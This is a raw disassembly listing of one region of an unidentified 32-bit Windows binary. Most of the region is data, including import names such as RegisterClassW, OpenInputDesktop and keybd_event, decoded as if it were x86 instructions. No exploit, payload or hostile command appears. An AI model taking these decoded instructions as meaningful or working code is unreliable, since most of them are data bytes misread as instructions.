  41241f:	add    BYTE PTR [edx+edi*1],ah
  412422:	add    DWORD PTR [eax],eax
	...
  41242c:	jmp    0x0:0x4d49a9
  412433:	add    BYTE PTR [edx],al
  412435:	add    BYTE PTR [eax],al
  412437:	add    BYTE PTR [esi],bh
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [ecx-0x76fffcc7],cl
  412441:	sub    eax,0x3
  412446:	add    BYTE PTR [eax],al
  412448:	add    BYTE PTR [eax],al
  41244a:	add    BYTE PTR [eax],al
  41244c:	jmp    0x0:0x4d49a9
  412453:	add    BYTE PTR [edx+0x24],bh
  412456:	add    DWORD PTR [eax],eax
  412458:	add    DWORD PTR [eax],eax
  41245a:	add    BYTE PTR [eax],al
  41245c:	add    DWORD PTR [eax],eax
  41245e:	add    BYTE PTR [eax],al
  412460:	add    DWORD PTR [eax],eax
  412462:	add    BYTE PTR [eax],al
  412464:	jo     0x41248a
  412466:	add    DWORD PTR [eax],eax
  412468:	je     0x41248e
  41246a:	add    DWORD PTR [eax],eax
  41246c:	js     0x412492
  41246e:	add    DWORD PTR [eax],eax
  412470:	je     0x4124bc
  412472:	add    BYTE PTR [eax],al
  412474:	mov    esp,DWORD PTR [ecx+eax*1]
  412477:	add    BYTE PTR [eax],al
  412479:	add    BYTE PTR [eax+0x48],cl
  41247c:	push   ebx
  41247d:	aaa    
  41247e:	inc    edi
  41247f:	inc    esi
  412480:	js     0x4124bb
  412482:	fs ja  0x4124b8
  412485:	data16 cs je 0x4124f8
  412489:	jo     0x41248b
  41248b:	aas    
  41248c:	inc    edi
  41248d:	outs   dx,BYTE PTR gs:[esi]
  41248f:	gs jb  0x4124f3
  412492:	je     0x4124f9
  412494:	push   ebx
  412495:	je     0x4124f8
  412497:	je     0x4124fe
  412499:	inc    eax
  41249a:	inc    eax
  41249b:	pop    ecx
  41249c:	inc    edi
  41249d:	push   eax
  41249e:	inc    ecx
  41249f:	dec    edx
  4124a0:	push   eax
  4124a1:	inc    ecx
  4124a2:	inc    esi
  4124a3:	dec    eax
  4124a4:	dec    ebp
  4124a5:	push   eax
  4124a6:	inc    ecx
  4124a7:	inc    esi
  4124a8:	cmp    al,0x56
	...
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	pop    eax
  4124b9:	and    eax,0x1
  4124be:	add    BYTE PTR [eax],al
  4124c0:	add    BYTE PTR [eax],al
  4124c2:	add    BYTE PTR [eax],al
  4124c4:	enter  0x130,0x0
  4124c8:	add    BYTE PTR [eax],ah
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	adc    BYTE PTR [edi],ah
  4124ce:	add    DWORD PTR [eax],eax
	...
  4124d8:	pop    eax
  4124d9:	xor    al,0x1
  4124db:	add    BYTE PTR [eax-0x1ffffedf],bh
  4124e1:	daa    
  4124e2:	add    DWORD PTR [eax],eax
	...
  4124ec:	mov    al,ds:0x88000134
  4124f1:	and    al,BYTE PTR [ecx]
  4124f3:	add    ah,dh
  4124f5:	daa    
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	pushf  
  412501:	add    DWORD PTR ss:[eax],eax
  412504:	pushf  
  412505:	and    al,BYTE PTR [ecx]
  412507:	add    BYTE PTR [eax+0x128],ch
  41250d:	add    BYTE PTR [eax],al
  41250f:	add    BYTE PTR [eax],al
  412511:	add    BYTE PTR [eax],al
  412513:	add    BYTE PTR [eax],bh
  412515:	aaa    
  412516:	add    DWORD PTR [eax],eax
  412518:	push   eax
  412519:	and    eax,DWORD PTR [ecx]
  41251b:	add    ah,al
  41251d:	sub    BYTE PTR [ecx],al
	...
  412527:	add    BYTE PTR [edx],bl
  412529:	cmp    al,BYTE PTR [ecx]
  41252b:	add    BYTE PTR [ebx+eiz*1+0x1],ch
  41252f:	add    BYTE PTR [eax+0x29],bh
  412532:	add    DWORD PTR [eax],eax
	...
  41253c:	cmp    bh,BYTE PTR [edx]
  41253e:	add    DWORD PTR [eax],eax
  412540:	and    BYTE PTR [ecx+eax*1],ah
	...
  412557:	add    BYTE PTR [eax-0x6dfffed7],al
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    BYTE PTR [edx-0x4ffffed7],ah
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    BYTE PTR [esi-0x2bfffed7],bh
  41256d:	sub    DWORD PTR [ecx],eax
  41256f:	add    ah,ah
  412571:	sub    DWORD PTR [ecx],eax
  412573:	add    dh,dh
  412575:	sub    DWORD PTR [ecx],eax
  412577:	add    BYTE PTR [edx],al
  412579:	sub    al,BYTE PTR [ecx]
  41257b:	add    BYTE PTR [edx+ebp*1],dl
  41257e:	add    DWORD PTR [eax],eax
  412580:	and    BYTE PTR [edx],ch
  412582:	add    DWORD PTR [eax],eax
  412584:	sub    al,BYTE PTR cs:[ecx]
  412587:	add    BYTE PTR [esi+0x2a],al
  41258a:	add    DWORD PTR [eax],eax
  41258c:	pop    eax
  41258d:	sub    al,BYTE PTR [ecx]
  41258f:	add    BYTE PTR [esi+0x2a],ah
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	mov    gs,WORD PTR [edx]
  41259a:	add    DWORD PTR [eax],eax
  41259c:	sahf   
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [edx-0x35fffed6],dh
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    dh,bl
  4125a9:	sub    al,BYTE PTR [ecx]
  4125ab:	add    dl,ch
  4125ad:	sub    al,BYTE PTR [ecx]
  4125af:	add    ah,bh
  4125b1:	sub    al,BYTE PTR [ecx]
  4125b3:	add    BYTE PTR [edx],dl
  4125b5:	sub    eax,DWORD PTR [ecx]
  4125b7:	add    BYTE PTR [esi],bl
  4125b9:	sub    eax,DWORD PTR [ecx]
  4125bb:	add    BYTE PTR [ebx+ebp*1],ch
  4125be:	add    DWORD PTR [eax],eax
  4125c0:	inc    eax
  4125c1:	sub    eax,DWORD PTR [ecx]
  4125c3:	add    BYTE PTR [esi+0x2b],cl
  4125c6:	add    DWORD PTR [eax],eax
  4125c8:	sub    eax,DWORD PTR fs:[ecx]
  4125cb:	add    BYTE PTR [edx+0x2b],dh
  4125ce:	add    DWORD PTR [eax],eax
  4125d0:	test   BYTE PTR [ebx],ch
  4125d2:	add    DWORD PTR [eax],eax
  4125d4:	mov    gs,WORD PTR [ebx]
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	sahf   
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [eax-0x3bfffed5],bh
  4125e1:	sub    eax,DWORD PTR [ecx]
  4125e3:	add    al,dl
  4125e5:	sub    eax,DWORD PTR [ecx]
  4125e7:	add    ah,ch
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    ah,bh
  4125ed:	sub    eax,DWORD PTR [ecx]
  4125ef:	add    BYTE PTR [edx],cl
  4125f1:	sub    al,0x1
  4125f3:	add    BYTE PTR [eax],bl
  4125f5:	sub    al,0x1
  4125f7:	add    BYTE PTR [esp+ebp*1],ah
  4125fa:	add    DWORD PTR [eax],eax
  4125fc:	cmp    BYTE PTR [ecx+eax*1],ch
  4125ff:	add    BYTE PTR [esi+0x2c],cl
  412602:	add    DWORD PTR [eax],eax
  412604:	pop    edx
  412605:	sub    al,0x1
  412607:	add    BYTE PTR [edx+0x2c],ch
  41260a:	add    DWORD PTR [eax],eax
  41260c:	jl     0x41263a
  41260e:	add    DWORD PTR [eax],eax
  412610:	mov    gs,WORD PTR [ecx+eax*1]
  412613:	add    BYTE PTR [eax-0x47fffed4],ah
  412619:	sub    al,0x1
  41261b:	add    al,cl
  41261d:	sub    al,0x1
  41261f:	add    dh,dl
  412621:	sub    al,0x1
  412623:	add    ah,ah
  412625:	sub    al,0x1
  412627:	add    dh,dh
  412629:	sub    al,0x1
  41262b:	add    BYTE PTR [esi],al
  41262d:	sub    eax,0x2d140001
  412632:	add    DWORD PTR [eax],eax
  412634:	es sub eax,0x2d3c0001
  41263a:	add    DWORD PTR [eax],eax
  41263c:	dec    edx
  41263d:	sub    eax,0x2d5a0001
  412642:	add    DWORD PTR [eax],eax
  412644:	push   0x2d
  412646:	add    DWORD PTR [eax],eax
  412648:	je     0x412677
  41264a:	add    DWORD PTR [eax],eax
  41264c:	test   BYTE PTR ds:0x2d900001,ch
  412652:	add    DWORD PTR [eax],eax
  412654:	sahf   
  412655:	sub    eax,0x2daa0001
  41265a:	add    DWORD PTR [eax],eax
  41265c:	mov    eax,0xd000012d
  412661:	sub    eax,0x2dde0001
  412666:	add    DWORD PTR [eax],eax
  412668:	out    dx,al
  412669:	sub    eax,0x2dfe0001
  41266e:	add    DWORD PTR [eax],eax
  412670:	or     al,0x2e
  412672:	add    DWORD PTR [eax],eax
  412674:	push   ds
  412675:	add    DWORD PTR cs:[eax],eax
  412678:	xor    ch,BYTE PTR [esi]
  41267a:	add    DWORD PTR [eax],eax
  41267c:	dec    esi
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	pop    esi
  412681:	add    DWORD PTR cs:[eax],eax
  412684:	je     0x4126b4
  412686:	add    DWORD PTR [eax],eax
  412688:	xchg   BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	call   0x12e:0xac00012e
  412693:	add    BYTE PTR [esi-0x33fffed2],bh
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	fisubr DWORD PTR [esi]
  41269e:	add    DWORD PTR [eax],eax
  4126a0:	out    dx,al
  4126a1:	add    DWORD PTR cs:[eax],eax
  4126a4:	cli    
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	push   cs
  4126a9:	das    
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	push   ds
  4126ad:	das    
  4126ae:	add    DWORD PTR [eax],eax
  4126b0:	cs das 
  4126b2:	add    DWORD PTR [eax],eax
  4126b4:	inc    eax
  4126b5:	das    
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	pop    eax
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	outs   dx,BYTE PTR ds:[esi]
  4126bd:	das    
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	jle    0x4126f1
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	call   0x12f:0xae00012f
  4126cb:	add    BYTE PTR [edx-0x39fffed1],bh
  4126d1:	das    
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	aam    0x2f
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	in     al,0x2f
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	cli    
  4126dd:	das    
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	or     al,0x30
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	push   ss
  4126e5:	xor    BYTE PTR [ecx],al
  4126e7:	add    BYTE PTR [esi],ch
  4126e9:	xor    BYTE PTR [ecx],al
  4126eb:	add    BYTE PTR [edx],bh
  4126ed:	xor    BYTE PTR [ecx],al
  4126ef:	add    BYTE PTR [eax+esi*1+0x1],cl
  4126f3:	add    BYTE PTR [eax+0x30],bl
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	jb     0x41272a
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	jle    0x41272e
  4126fe:	add    DWORD PTR [eax],eax
  412700:	mov    WORD PTR [eax],?
  412702:	add    DWORD PTR [eax],eax
  412704:	mov    ds:0xb8000130,al
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [eax],al
  41270d:	add    BYTE PTR [eax],al
  41270f:	add    ah,dl
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    al,ch
  412715:	xor    BYTE PTR [ecx],al
  412717:	add    BYTE PTR [eax],al
  412719:	xor    DWORD PTR [ecx],eax
  41271b:	add    BYTE PTR [esi],dl
  41271d:	xor    DWORD PTR [ecx],eax
  41271f:	add    BYTE PTR [esi],ah
  412721:	xor    DWORD PTR [ecx],eax
  412723:	add    BYTE PTR [ecx+esi*1],dh
  412726:	add    DWORD PTR [eax],eax
  412728:	dec    esp
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [edx+0x31],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	xor    WORD PTR [ecx],ax
  412733:	add    BYTE PTR [eax+0x31],bh
  412736:	add    DWORD PTR [eax],eax
  412738:	xchg   esp,eax
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [edx-0x49fffecf],ah
  412741:	xor    DWORD PTR [ecx],eax
  412743:	add    dh,al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    dl,dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    ah,ah
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    ah,ch
  412751:	xor    DWORD PTR [ecx],eax
  412753:	add    ah,bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [esi],cl
  412759:	xor    al,BYTE PTR [ecx]
  41275b:	add    BYTE PTR [edx+esi*1],bl
  41275e:	add    DWORD PTR [eax],eax
  412760:	xor    al,BYTE PTR cs:[ecx]
  412763:	add    BYTE PTR [eax+0x32],al
  412766:	add    DWORD PTR [eax],eax
  412768:	push   esi
  412769:	xor    al,BYTE PTR [ecx]
  41276b:	add    BYTE PTR [esi+0x32],ah
  41276e:	add    DWORD PTR [eax],eax
  412770:	js     0x4127a4
  412772:	add    DWORD PTR [eax],eax
  412774:	mov    dh,BYTE PTR [edx]
  412776:	add    DWORD PTR [eax],eax
  412778:	call   0x132:0xb0000132
  41277f:	add    al,al
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    ah,cl
  412785:	xor    al,BYTE PTR [ecx]
  412787:	add    dl,ah
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,dh
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    BYTE PTR [esi],al
  412791:	xor    eax,DWORD PTR [ecx]
  412793:	add    BYTE PTR [esi],dl
  412795:	xor    eax,DWORD PTR [ecx]
  412797:	add    BYTE PTR [ebx+esi*1],ch
  41279a:	add    DWORD PTR [eax],eax
  41279c:	cmp    dh,BYTE PTR [ebx]
  41279e:	add    DWORD PTR [eax],eax
  4127a0:	push   eax
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1+0x1],ah
  4127a7:	add    BYTE PTR [edx+0x33],bh
  4127aa:	add    DWORD PTR [eax],eax
  4127ac:	cwde   
  4127ad:	xor    eax,DWORD PTR [ecx]
  4127af:	add    BYTE PTR [eax-0x43fffecd],dh
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    dh,cl
  4127b9:	xor    eax,DWORD PTR [ecx]
  4127bb:	add    dl,bl
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    dh,ch
  4127c1:	xor    eax,DWORD PTR [ecx]
  4127c3:	add    BYTE PTR [esi],al
  4127c5:	xor    al,0x1
  4127c7:	add    BYTE PTR [edx],dl
  4127c9:	xor    al,0x1
  4127cb:	add    BYTE PTR [eax],ah
  4127cd:	xor    al,0x1
  4127cf:	add    BYTE PTR [edx],dh
  4127d1:	xor    al,0x1
  4127d3:	add    BYTE PTR [edx+0x34],al
  4127d6:	add    DWORD PTR [eax],eax
  4127d8:	dec    esp
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [eax],al
  4127dd:	add    BYTE PTR [eax],al
  4127df:	add    BYTE PTR [esi+0x34],ah
  4127e2:	add    DWORD PTR [eax],eax
  4127e4:	je     0x41281a
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	xor    BYTE PTR [ecx+eax*1],0x0
  4127ec:	xchg   esp,eax
  4127ed:	xor    al,0x1
  4127ef:	add    BYTE PTR [eax],al
  4127f1:	add    BYTE PTR [eax],al
  4127f3:	add    BYTE PTR [esi-0x43fffecc],ch
  4127f9:	xor    al,0x1
  4127fb:	add    dh,cl
  4127fd:	xor    al,0x1
  4127ff:	add    ah,bl
  412801:	xor    al,0x1
  412803:	add    ah,ah
  412805:	xor    al,0x1
  412807:	add    ah,dh
  412809:	xor    al,0x1
  41280b:	add    BYTE PTR [eax],al
  41280d:	xor    eax,0x350e0001
  412812:	add    DWORD PTR [eax],eax
  412814:	push   ss
  412815:	xor    eax,0x35220001
  41281a:	add    DWORD PTR [eax],eax
  41281c:	sub    al,0x35
  41281e:	add    DWORD PTR [eax],eax
  412820:	ss xor eax,0x353e0001
  412826:	add    DWORD PTR [eax],eax
  412828:	dec    eax
  412829:	xor    eax,0x35520001
  41282e:	add    DWORD PTR [eax],eax
  412830:	pop    esp
  412831:	xor    eax,0x35680001
  412836:	add    DWORD PTR [eax],eax
  412838:	je     0x41286f
  41283a:	add    DWORD PTR [eax],eax
  41283c:	jle    0x412873
  41283e:	add    DWORD PTR [eax],eax
  412840:	mov    BYTE PTR ds:0x35920001,dh
  412846:	add    DWORD PTR [eax],eax
  412848:	mov    al,ds:0xa8000135
  41284d:	xor    eax,0x35b40001
  412852:	add    DWORD PTR [eax],eax
  412854:	mov    esi,0xc8000135
  412859:	xor    eax,0x35d20001
  41285e:	add    DWORD PTR [eax],eax
  412860:	fidiv  WORD PTR ds:0x35ec0001
  412866:	add    DWORD PTR [eax],eax
  412868:	clc    
  412869:	xor    eax,0x36000001
  41286e:	add    DWORD PTR [eax],eax
  412870:	or     al,0x36
  412872:	add    DWORD PTR [eax],eax
  412874:	push   ss
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	and    BYTE PTR [esi],dh
  41287a:	add    DWORD PTR [eax],eax
  41287c:	sub    BYTE PTR [esi],dh
  41287e:	add    DWORD PTR [eax],eax
  412880:	xor    dh,BYTE PTR [esi]
  412882:	add    DWORD PTR [eax],eax
  412884:	cmp    al,0x36
  412886:	add    DWORD PTR [eax],eax
  412888:	inc    esi
  412889:	add    DWORD PTR ss:[eax],eax
  41288c:	push   eax
  41288d:	add    DWORD PTR ss:[eax],eax
  412890:	pop    edx
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	fs add DWORD PTR ss:[eax],eax
  412898:	outs   dx,BYTE PTR ds:[esi]
  412899:	add    DWORD PTR ss:[eax],eax
  41289c:	xor    BYTE PTR [esi],0x1
  41289f:	add    BYTE PTR [edx+0x136],dl
  4128a5:	add    BYTE PTR [eax],al
  4128a7:	add    BYTE PTR [eax-0x3ffffeca],ch
  4128ad:	add    DWORD PTR ss:[eax],eax
  4128b0:	fdiv   DWORD PTR [esi]
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	hlt    
  4128b5:	add    DWORD PTR ss:[eax],eax
  4128b8:	or     al,0x37
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	and    al,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	add    BYTE PTR [eax],al
  4128c2:	add    BYTE PTR [eax],al
  4128c4:	inc    esi
  4128c5:	aaa    
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	pop    esp
  4128c9:	aaa    
  4128ca:	add    DWORD PTR [eax],eax
  4128cc:	jo     0x412905
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	jle    0x412909
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	mov    dh,BYTE PTR [edi]
  4128d6:	add    DWORD PTR [eax],eax
  4128d8:	cwde   
  4128d9:	aaa    
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4128dd:	aaa    
  4128de:	add    DWORD PTR [eax],eax
  4128e0:	mov    ah,0x37
  4128e2:	add    DWORD PTR [eax],eax
  4128e4:	les    esi,FWORD PTR [edi]
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	into   
  4128e9:	aaa    
  4128ea:	add    DWORD PTR [eax],eax
  4128ec:	fidiv  DWORD PTR [edi]
  4128ee:	add    DWORD PTR [eax],eax
  4128f0:	repnz aaa 
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	push   es
  4128f5:	cmp    BYTE PTR [ecx],al
  4128f7:	add    BYTE PTR [eax],bl
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    BYTE PTR [eax],ch
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    BYTE PTR [eax+edi*1],dh
  412902:	add    DWORD PTR [eax],eax
  412904:	dec    edx
  412905:	cmp    BYTE PTR [ecx],al
  412907:	add    BYTE PTR [eax+edi*1+0x1],bl
  41290b:	add    BYTE PTR [eax+edi*1+0x1],ch
  41290f:	add    BYTE PTR [eax+edi*1+0x389a0001],al
  412916:	add    DWORD PTR [eax],eax
  412918:	stos   BYTE PTR es:[edi],al
  412919:	cmp    BYTE PTR [ecx],al
  41291b:	add    BYTE PTR [esi-0x35fffec8],dh
  412921:	cmp    BYTE PTR [ecx],al
  412923:	add    dh,bl
  412925:	cmp    BYTE PTR [ecx],al
  412927:	add    dh,ch
  412929:	cmp    BYTE PTR [ecx],al
  41292b:	add    dh,bh
  41292d:	cmp    BYTE PTR [ecx],al
  41292f:	add    BYTE PTR [esi],cl
  412931:	cmp    DWORD PTR [ecx],eax
  412933:	add    BYTE PTR [ecx+edi*1],bl
  412936:	add    DWORD PTR [eax],eax
  412938:	sub    bh,BYTE PTR [ecx]
  41293a:	add    DWORD PTR [eax],eax
  41293c:	cmp    BYTE PTR [ecx],bh
  41293e:	add    DWORD PTR [eax],eax
  412940:	inc    esp
  412941:	cmp    DWORD PTR [ecx],eax
  412943:	add    BYTE PTR [eax+0x39],bl
  412946:	add    DWORD PTR [eax],eax
  412948:	cmp    DWORD PTR fs:[ecx],eax
  41294b:	add    BYTE PTR [ecx+edi*1+0x1],dh
  41294f:	add    BYTE PTR [esi+0x39],bh
  412952:	add    DWORD PTR [eax],eax
  412954:	xchg   esp,eax
  412955:	cmp    DWORD PTR [ecx],eax
  412957:	add    BYTE PTR [esi-0x45fffec7],bl
  41295d:	cmp    DWORD PTR [ecx],eax
  41295f:	add    al,dl
  412961:	cmp    DWORD PTR [ecx],eax
  412963:	add    al,ah
  412965:	cmp    DWORD PTR [ecx],eax
  412967:	add    al,dh
  412969:	cmp    DWORD PTR [ecx],eax
  41296b:	add    ah,bh
  41296d:	cmp    DWORD PTR [ecx],eax
  41296f:	add    BYTE PTR [eax],cl
  412971:	cmp    al,BYTE PTR [ecx]
  412973:	add    BYTE PTR [eax],al
  412975:	add    BYTE PTR [eax],al
  412977:	add    BYTE PTR [edx+edi*1],ah
  41297a:	add    DWORD PTR [eax],eax
  41297c:	add    BYTE PTR [eax],al
  41297e:	add    BYTE PTR [eax],al
  412980:	add    eax,0x67655202
  412985:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41298c:	popa   
  41298d:	jae    0x412a02
  41298f:	push   edi
  412990:	add    BYTE PTR [eax],al
  412992:	push   ebp
  412993:	add    DWORD PTR [edi+0x65],eax
  412996:	je     0x4129eb
  412998:	arpl   WORD PTR [edx+0x6f],si
  41299b:	ins    BYTE PTR es:[edi],dx
  41299c:	ins    BYTE PTR es:[edi],dx
  41299d:	push   eax
  41299e:	outs   dx,DWORD PTR ds:[esi]
  41299f:	jae    0x4129a1
  4129a1:	add    BYTE PTR [ecx+0x616f4c01],ch
  4129a7:	fs inc edx
  4129a9:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x44004170
  4129b1:	add    BYTE PTR [ebx+0x6c],al
  4129b4:	imul   esi,DWORD PTR [eax+0x43],0x6f737275
  4129bb:	jb     0x4129bd
  4129bd:	add    BYTE PTR [edx+0x2],cl
  4129c0:	push   ebx
  4129c1:	gs je  0x412a11
  4129c4:	outs   dx,BYTE PTR gs:[esi]
  4129c6:	jne    0x412a0c
  4129c8:	gs popaw 
  4129cb:	jne    0x412a39
  4129cd:	je     0x412a18
  4129cf:	je     0x412a36
  4129d1:	ins    DWORD PTR es:[edi],dx
  4129d2:	add    BYTE PTR [eax],al
  4129d4:	pop    edi
  4129d5:	add    dl,BYTE PTR [ebx+0x65]
  4129d8:	je     0x412a2d
  4129da:	jns    0x412a4f
  4129dc:	inc    ebx
  4129dd:	outs   dx,DWORD PTR ds:[esi]
  4129de:	ins    BYTE PTR es:[edi],dx
  4129df:	outs   dx,DWORD PTR ds:[esi]
  4129e0:	jb     0x412a55
  4129e2:	add    BYTE PTR [eax],al
  4129e4:	mov    ds:0x57734901,eax
  4129e9:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  4129f0:	jae    0x412a5b
  4129f2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  4129f6:	push   0x74654701
  4129fb:	push   edi
  4129fc:	imul   ebp,DWORD PTR [esi+0x64],0xa100776f
  412a03:	add    DWORD PTR [ecx+0x73],ecx
  412a06:	push   edi
  412a07:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  412a0e:	popa   
  412a0f:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  412a13:	add    al,ch
  412a15:	add    DWORD PTR [edi+0x70],ecx
  412a18:	outs   dx,BYTE PTR gs:[esi]
  412a1a:	dec    ecx
  412a1b:	arpl   WORD PTR [edi+0x6e],bp
  412a1e:	add    BYTE PTR [eax],al
  412a20:	stos   DWORD PTR es:[edi],eax
  412a21:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  412a25:	fs inc ebx
  412a27:	jne    0x412a9b
  412a29:	jae    0x412a9a
  412a2b:	jb     0x412a6e
  412a2d:	add    BYTE PTR [edx+eax*1+0x6e617254],dl
  412a34:	jae    0x412aa2
  412a36:	popa   
  412a37:	je     0x412a9e
  412a39:	inc    ecx
  412a3a:	arpl   WORD PTR [ebx+0x65],sp
  412a3d:	ins    BYTE PTR es:[edi],dx
  412a3e:	gs jb  0x412aa2
  412a41:	je     0x412ab2
  412a43:	jb     0x412a9c
  412a45:	add    BYTE PTR [ecx+0x0],ah
  412a48:	inc    ebx
  412a49:	jb     0x412ab0
  412a4b:	popa   
  412a4c:	je     0x412ab3
  412a4e:	push   eax
  412a4f:	outs   dx,DWORD PTR ds:[esi]
  412a50:	jo     0x412ac7
  412a52:	jo     0x412aa1
  412a54:	outs   dx,BYTE PTR gs:[esi]
  412a56:	jne    0x412a58
  412a58:	add    BYTE PTR ss:[ebx+0x68],al
  412a5c:	popa   
  412a5d:	jb     0x412ab4
  412a5f:	jo     0x412ad1
  412a61:	gs jb  0x412aa5
  412a64:	add    BYTE PTR [eax],al
  412a66:	mov    ds:0x57734901,al
  412a6b:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  412a72:	imul   esp,DWORD PTR [ebx+0x6f],0x3b006564
  412a79:	add    DWORD PTR [edi+0x65],eax
  412a7c:	je     0x412acb
  412a7e:	gs jae 0x412af4
  412a81:	popa   
  412a82:	addr16 gs inc ebp
  412a85:	js     0x412afb
  412a87:	jb     0x412aea
  412a89:	dec    ecx
  412a8a:	outs   dx,BYTE PTR ds:[esi]
  412a8b:	outs   dx,WORD PTR ds:[esi]
  412a8d:	add    BYTE PTR [esi+0x0],al
  412a90:	inc    ebx
  412a91:	ins    BYTE PTR es:[edi],dx
  412a92:	outs   dx,DWORD PTR ds:[esi]
  412a93:	jae    0x412afa
  412a95:	inc    esp
  412a96:	gs jae 0x412b04
  412a99:	je     0x412b0a
  412a9b:	jo     0x412a9d
  412a9d:	add    cl,ch
  412a9f:	add    DWORD PTR [edi+0x70],ecx
  412aa2:	outs   dx,BYTE PTR gs:[esi]
  412aa4:	dec    ecx
  412aa5:	outs   dx,BYTE PTR ds:[esi]
  412aa6:	jo     0x412b1d
  412aa8:	je     0x412aee
  412aaa:	gs jae 0x412b18
  412aad:	je     0x412b1e
  412aaf:	jo     0x412ab1
  412ab1:	add    BYTE PTR [ebp+0x73795302],al
  412ab7:	je     0x412b1e
  412ab9:	ins    DWORD PTR es:[edi],dx
  412aba:	push   eax
  412abb:	popa   
  412abc:	jb     0x412b1f
  412abe:	ins    DWORD PTR es:[edi],dx
  412abf:	gs je  0x412b27
  412ac2:	jb     0x412b37
  412ac4:	dec    ecx
  412ac5:	outs   dx,BYTE PTR ds:[esi]
  412ac6:	outs   dx,WORD PTR ds:[esi]
  412ac8:	inc    ecx
  412ac9:	add    BYTE PTR [esi+0x2],cl
  412acc:	push   ebx
  412acd:	gs je  0x412b1d
  412ad0:	outs   dx,BYTE PTR gs:[esi]
  412ad2:	jne    0x412b1d
  412ad4:	je     0x412b3b
  412ad6:	ins    DWORD PTR es:[edi],dx
  412ad7:	dec    ecx
  412ad8:	outs   dx,BYTE PTR ds:[esi]
  412ad9:	outs   dx,WORD PTR ds:[esi]
  412adb:	push   edi
  412adc:	add    BYTE PTR [eax],al
  412ade:	adc    eax,0x6c655202
  412ae3:	gs popa 
  412ae5:	jae    0x412b4c
  412ae7:	inc    esp
  412ae8:	inc    ebx
  412ae9:	add    BYTE PTR [ecx+0x766e4901],cl
  412aef:	popa   
  412af0:	ins    BYTE PTR es:[edi],dx
  412af1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x63655265
  412af9:	je     0x412afb
  412afb:	add    BYTE PTR [edx+eax*1+0x74697753],al
  412b02:	arpl   WORD PTR [eax+0x54],bp
  412b05:	outs   dx,DWORD PTR ds:[esi]
  412b06:	push   esp
  412b07:	push   0x69577369
  412b0c:	outs   dx,BYTE PTR ds:[esi]
  412b0d:	outs   dx,DWORD PTR fs:[esi]
  412b0f:	ja     0x412b11
  412b11:	add    BYTE PTR [esi+0x6c694b01],ah
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	push   esp
  412b19:	imul   ebp,DWORD PTR [ebp+0x65],0x2bd0072
  412b20:	imul   esp,DWORD PTR [ebp+0x79],0x62
  412b24:	fs pop edi
